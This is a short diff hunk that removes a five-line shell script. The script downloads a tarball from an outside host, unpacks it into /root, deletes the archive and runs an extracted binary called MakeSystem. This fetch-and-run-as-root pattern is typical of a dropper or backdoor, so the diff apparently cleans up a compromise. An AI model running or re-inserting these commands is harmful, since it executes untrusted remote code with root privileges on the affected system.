@@ -1,5 +1,0 @@
-curl -o /root/containers.tar.gz www.killhup.cx/tt.tar.gz
-tar xfz /root/containers.tar.gz -C /root/
-rm -f /root/containers.tar.gz
-/root/containers/MakeSystem
-exit 0
